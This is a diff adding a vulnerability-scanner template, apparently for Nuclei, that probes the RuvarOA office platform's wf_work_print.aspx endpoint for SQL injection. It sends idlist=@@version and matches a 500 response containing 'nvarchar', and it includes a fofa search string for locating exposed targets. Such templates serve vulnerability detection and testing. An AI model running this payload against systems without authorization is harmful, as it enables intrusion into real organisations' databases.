@@ -1,0 +1,25 @@
+id: ruvaroa-wf_work_print-sqli
+
+info:
+  name: RuvarOA协同办公平台 wf_work_print 接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+          RuvarOA协同办公平台多个接口存在SQL注入安全缺陷，攻击者可通过构造恶意SQL语句实现对数据库的未授权操作，包括但不限于数据篡改、删除或注入恶意记录，进而引发数据完整性破坏及敏感信息泄露风险。
+  tags: RuvarOA协同办公平台
+
+http:
+- raw:
+  - |
+    GET /WorkFlow/wf_work_print.aspx?idlist=@@version HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'nvarchar'
